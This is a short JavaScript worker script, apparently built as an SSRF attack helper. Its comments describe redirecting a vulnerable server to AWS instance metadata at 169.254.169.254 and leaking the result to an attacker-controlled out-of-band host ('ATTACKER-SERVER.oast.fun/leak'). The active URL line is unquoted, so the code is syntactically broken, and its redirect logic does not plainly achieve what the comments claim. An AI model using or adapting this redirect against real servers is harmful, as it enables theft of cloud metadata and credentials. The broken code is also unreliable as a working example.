export default {
  async fetch(request) {
    // Step 1: Redirect the VULNERABLE SERVER to AWS metadata
    // const awsUrl = "http://169.254.169.254/latest/meta-data/hostname";
    const awsUrl = https://api.ipify.org/;
    
    // Step 2: Force the server to include AWS data in the URL path/params
    const interactshUrl = "https://ATTACKER-SERVER.oast.fun/leak?url=";
    return Response.redirect(`${awsUrl}?redirect=${encodeURIComponent(interactshUrl)}`, 302);
  }
};
